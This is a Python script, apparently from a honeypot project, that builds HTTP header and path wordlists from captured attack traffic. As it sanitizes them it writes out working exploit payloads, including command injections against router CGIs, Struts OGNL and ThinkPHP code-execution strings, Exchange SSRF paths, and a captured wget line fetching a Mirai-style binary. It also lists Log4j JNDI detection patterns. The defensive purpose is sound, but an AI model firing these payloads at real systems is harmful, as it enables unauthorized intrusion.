#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import glob
import re

def extract_all_keys(data, key):
    searches = set()
    for result in data:
        for _key in data[result].keys():
            if key.lower() == _key.lower():
                searches.add(data[result][_key])
    return searches

data = dict()

print("[+] Loading data")
for file in glob.iglob("./dump/**/*.json"):
    with open(file, 'r') as f:
        try:
            data[file] = json.loads(f.read())
        except Exception as e:
            print(f"Exception on {f}: {e}")

print("[+] Extracting keys")
doings = [
    "accept",
    "accept-charset",
    "accept-encoding",
    "accept-language",
    "authorization",
    "body",
    "cache-control",
    "connection",
    "content-type",
    "cookie",
    "from",
    "keep-alive",
    "method",
    "password",
    "path",
    "soapaction",
    "user-agent",
    "username",
    "version",
    "via",
    "x-forwarded-for",
    "x-requested-with"
]

for doing in doings:
    print(f"[+] Dumping: {doing}")
    findings = extract_all_keys(data, doing)
    with open(f"wordlists/{doing}.lst", "r") as f:
        findings = findings.union(set(f.read().splitlines()))
    # Implement filtering and sanitization
    if doing == "accept":
        pass # Nothing to do yet
    elif doing == "accept-charset":
        findings = [_ for _ in findings if not "c3lzdGVtKC" in _]
        findings.append("c3lzdGVtKCdkaXIgL2Ivcy93IHd3dycpOw==")
        pass # Nothing to do yet
    elif doing == "accept-encoding":
        pass # Nothing to do yet
    elif doing == "accept-language":
        pass # Nothing to do yet
    elif doing == "authorization":
        pass # Nothing to do yet
    elif doing == "body":
        pass # This will always be dangerous anyway
    elif doing == "cache-control":
        pass # Nothing to do yet
    elif doing == "connection":
        pass # Nothing to do yet
    elif doing == "content-type":
        findings = [_ for _ in findings if not "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader" in _]
        findings.append("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xuh9ugc2','1')}.multipart/form-data")
        pass # Nothing to do yet
    elif doing == "cookie":
        findings = [_ for _ in findings if not _.startswith("d2dldCBodHR")]
        findings.append("d2dldCBodHRwOi8vMTI3LjAuMC4xLw==")
        pass # Nothing to do yet
    elif doing == "from":
        pass # Nothing to do yet
    elif doing == "keep-alive":
        pass # Nothing to do yet
    elif doing == "method":
        pass # Nothing to do yet
    elif doing == "password":
        pass # Nothing to do yet
    elif doing == "path":
        findings = [_.lstrip("/") for _ in findings]
        findings = [re.sub(r"^https?://[^/]+[:0-9]*/*", "", _, flags=re.I) for _ in findings]
        findings = [re.sub(r"^[-.a-zA-Z0-9:]+:[0-9:]+$", "", _, flags=re.I) for _ in findings]
        findings = [re.sub(r"^[a-z0-9]{27}$", "", _, flags=re.I) for _ in findings]
        findings = [_ for _ in findings if not "204.48.20.180" in _]
        findings = [_ for _ in findings if not "Nmap/folder/check" in _]
        findings = [_ for _ in findings if not "NmapUpperCheck" in _]
        findings = [_ for _ in findings if not "nmaplowercheck" in _]

        findings = [_ for _ in findings if not "backupmgt/localJob.php?session=fail" in _]
        findings.append("backupmgt/localJob.php?session=fail;whoami")
        findings = [_ for _ in findings if not "board.cgi?cmd=" in _]
        findings.append("board.cgi?cmd=whoami")
        findings = [_ for _ in findings if not "cgi-bin/;" in _]
        findings.append("cgi-bin/;whoami")
        findings = [_ for _ in findings if not "cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=" in _]
        findings.append("cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0Awhoami%0A'")
        findings = [_ for _ in findings if not "cgi-bin/masterCGI?ping=nomip&user=;" in _]
        findings.append("cgi-bin/masterCGI?ping=nomip&user=;whoami")
        findings = [_ for _ in findings if not "cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(" in _]
        findings.append("cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(whoami)&password=admin")
        findings = [_ for _ in findings if not "incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=" in _]
        findings.append("incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22whoami%22%20--%3e")
        findings = [_ for _ in findings if not "echo.php?" in _]
        findings.append("echo.php?")
        findings = [_ for _ in findings if not "include/makecvs.php?Event=%60" in _]
        findings.append("include/makecvs.php?Event=%60whoami%60")
        findings = [_ for _ in findings if not "language/Swedish${IFS}&&" in _]
        findings.append("language/Swedish${IFS}&&${IFS}whoami;/string.js")
        findings = [_ for _ in findings if not "maint/modules/home/index.php?lang=english|" in _]
        findings.append("maint/modules/home/index.php?lang=english|whoami||x")
        findings = [_ for _ in findings if not "restapps/applications.php?linestate=$$LINESTATE$$&user=" in _]
        findings.append("restapps/applications.php?linestate=$$LINESTATE$$&user=100%0AContext%3A%20ext-local%0A%0AAction%3A%20Originate%0AChannel%3A%20Local%2F555%40app-chanspy%0AApplication%3A%20system%0Adata%3A%20whoami%0A%0A%0A%0A")
        findings = [_ for _ in findings if not "set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=" in _]
        findings.append("set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28whoami%29")
        findings = [_ for _ in findings if not "setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://188.166.55.83/sora.mips%20-O%20/var/tmp/sora.mips" in _]
        findings.append("setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=whoami;&curpath=/&currentsetting.htm=1")
        findings = [_ for _ in findings if not "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=" in _]
        findings.append("setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=whoami;&curpath=/&currentsetting.htm=1")
        findings = [_ for _ in findings if not "shell?cd" in _]
        findings.append("shell?whoami;")
        findings = [_ for _ in findings if not "azenv.php?" in _]
        findings.append("azenv.php")
        findings = [_ for _ in findings if not re.search("^text(/folder/review|404|Check)", _)]
        findings = [_ for _ in findings if not "dns-query?dns=" in _]
        findings.append("dns-query?dns=bG9jYWxob3N0")
        findings = [_ for _ in findings if not "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils" in _]
        findings.append("%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D//")
        findings = [_ for _ in findings if not "function=call_user_func_array&vars[0]=md5&vars[1][]=" in _]
        findings.append("s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=4jyqfh7x")
        findings = [_ for _ in findings if not "invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id" in _]
        findings.append("public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id")
        findings = [_ for _ in findings if not "owa/auth/logon.aspx?replaceCurrent=" in _]
        findings.append("owa/auth/logon.aspx?replaceCurrent=1&url=http://127.0.0.1/ecp")
        findings = [_ for _ in findings if not "owa/auth/logon.aspx?url=" in _]
        findings.append("owa/auth/logon.aspx?url=http://127.0.0.1/ecp")
        findings = [_ for _ in findings if not "autodiscover/autodiscover.json" in _.lower()]
        findings.append("autodiscover/autodiscover.json?a=a@127.0.0.1/ews/exchange.asmx")
        

        """
        findings = [_ for _ in findings if not "TEMPLATE" in _]
        findings.append("TEMPLATE")
        """
    elif doing == "soapaction":
        # print(findings)
        findings = [_ for _ in findings if not "purenetworks.com" in _]
        findings.append("http://purenetworks.com/HNAP1/`whoami`")
    elif doing == "user-agent":
        pass # Nothing to do yet
    elif doing == "username":
        pass # Nothing to do yet
    elif doing == "version":
        pass # Nothing to do yet
    elif doing == "via":
        pass # Nothing to do yet
    elif doing == "x-forwarded-for":
        # TODO test me on next compile
        # findings = [_ for _ in findings if not re.search(r"^[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}$", _)]
        pass # Nothing to do yet
    elif doing == "x-requested-with":
        pass # Nothing to do yet
    
    # Fucking log4j garbage
    findings = [_ for _ in findings if not re.search(r"\$\{lower", _)]
    findings = [_ for _ in findings if not re.search(r"\$\{::-j\}", _)]
    findings = [_ for _ in findings if not re.search(r"jndi:", _)]
    findings = [_ for _ in findings if not re.search(r"\$\{jnd", _)]
    findings = [_ for _ in findings if not re.search(r"\$\{env:", _)]
    findings = [_ for _ in findings if not re.search(r"jndi%3Aldap", _)]
    findings = [_ for _ in findings if not re.search(r"%7Dndi", _)]
    findings = [_ for _ in findings if not re.search(r"JHtqbm", _)]
    findings = [_ for _ in findings if not re.search(r"jndi:dns", _)]
    findings = [_ for _ in findings if not re.search(r"-j\}\$\{", _)]

    # for finding in findings:
    #     if re.search(r"jndi:dns", finding):
    #         import ipdb; ipdb.set_trace()
    
    # if doing == "accept-encoding":
        # import ipdb; ipdb.set_trace()
    # Final cleanup
    findings = list(filter(None, findings))
    findings = sorted(list(set(findings)))

    # Dump to filesystem
    with open(f"wordlists/{doing}.lst", "w") as f:
        f.write("\n".join(findings))

print("All done, now check and sanityze with:")
print("git diff HEAD")
print("And update params with")
print("grep -hrioP '[a-zA-Z0-9_-]+=' dump | tr -d = > /tmp/params; cat /opt/pypotomux/wordlists/params.lst /tmp/params | sort -uV -o /opt/pypotomux/wordlists/params.lst")
print("Once you'de done, remember to clean with:")
print("#find dump -type f -delete")
